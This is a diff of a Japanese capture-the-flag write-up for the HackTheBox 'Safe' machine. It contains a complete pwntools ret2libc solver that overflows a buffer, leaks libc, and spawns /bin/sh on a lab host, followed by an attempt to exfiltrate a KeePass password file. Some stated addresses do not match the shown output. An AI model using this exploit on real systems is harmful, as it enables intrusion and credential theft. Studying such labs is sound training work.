@@ -35,7 +35,7 @@ socialImage: "/media/cards/no-image.png"
 - [本記事について](#本記事について)
 - [探索](#探索)
   - [BOFを悪用してシェルを取得する](#bofを悪用してシェルを取得する)
-
+- [内部探索](#内部探索)
 
 ## 探索
 
@@ -148,24 +148,128 @@ $ objdump -d -M intel -j .plt myapp
   40104b:       e9 d0 ff ff ff          jmp    401020 <.plt>
 ```
 
+gdbで探してみても同じアドレスにあるようです。
 
+PIEは無効っぽいのでこのアドレスは不変です。
 
 ``` bash
-$ p system
-$4 = {int (const char *)} 0x7ffff7e1f860 <__libc_system>
+$ info functions
+Non-debugging symbols:
+0x0000000000401040  system@plt
+
+$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
 ```
 
+シンプルなBOFなので、最終的にはこういう感じにしたいです。
 
+1. `pop rdi; ret`のガジェットを探す
+2. BOFでripの次のスタック領域に“/bin/sh”を入れる
+3. 次のスタック領域にsystemのアドレスを入れる
 
+というわけでさっそくやっていきます。
 
+入力値が格納されるアドレスとRBPの差分が112バイトなので、入力に120文字突っ込めばrip以降のスタック領域を改ざんできることがわかります。
 
+``` bash
+$ p=$(ps -ef | grep -v grep | grep myapp | awk '{print $2}'); gdb -p $p -x gdbcmd.txt
+RDI: 0x7ffc120a2160 --> 0x74736574 ('test')
+RBP: 0x7ffc120a21d0 --> 0x0 
+```
 
+pedaのropgadgetを使うと、popretが0x401139に存在することがわかりました。
 
+``` bash
+$ ROPgadget --binary myapp | grep pop
+0x000000000040120b : pop rdi ; ret
+0x0000000000401209 : pop rsi ; pop r15 ; ret
+```
 
+ここから結構ハマりましたが、最終的に以下のステップでFlagを取得することができました。
 
+1. ret2libcを使って、putsのアドレスをリークさせる
+2. [libc database search](https://libc.blukat.me/?q=puts%3Af90&l=libc6_2.24-11%2Bdeb9u4_amd64)を使い、libcのバージョンを特定
 
+![image-20220714225205008](../../static/media/2022-06-12-hackthebox-linux-safe/image-20220714225205008.png)
 
+3. 相対オフセットで`/bin/sh`のアドレスを特定して、ROPを使ってsystem関数を実行する
 
+実際に使用したsolverは以下になります。
+
+``` python
+from pwn import *
+
+# Local
+p = process("./myapp")
+
+# Remote
+p = remote("10.10.10.147", 1337)
+
+elf = ELF("./myapp")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+context.binary = elf
+
+junk = b"\x41"*120
+main = p64(0x40115f)
+system = p64(0x401040)
+
+pop_rdi = p64(0x40120b)
+pop_rsi_r15 = p64(0x401209)
+
+payload = b""
+payload += b"\x41"*120
+payload += pop_rdi
+payload += p64(elf.got["puts"])
+payload += p64(elf.plt["system"])
+payload += p64(elf.sym["main"])
+
+print(p.recvline())
+p.sendline(payload)
+
+# a = p.recvline().rstrip()
+# print(a)
+# print(a[7:-11])
+
+leak = u64(p.recvline().rstrip()[7:-11].ljust(8, b"\x00"))
+print(hex(leak))
+print(leak)
+
+base = leak - 0x068f90
+print(hex(base))
+
+payload = b""
+payload += b"\x41"*120
+payload += pop_rdi
+# payload += p64(next(libc.search(b"/bin/sh\x00")))
+# payload += p64(libc.sym["system"])
+payload += p64(base+0x161c19)
+payload += p64(elf.plt["system"])
+
+print(p.recvline())
+p.sendline(payload)
+p.interactive()
+```
+
+これでuserフラグを取得できました。
+
+## 内部探索
+
+ホームディレクトリをのぞいたところ、`MyPasswords.kdbx`といういかにもなファイルがありました。
+
+とりあえずこれを解析するため、ファイル転送を試みました。
+
+``` bash
+$ ls
+myapp
+MyPasswords.kdbx
+user.txt
+```
+
+しかし、victimマシンにはcurl、ftp、pythonなどが存在せず、sshやscpもうまく動作しない状況でした。
 
 
 
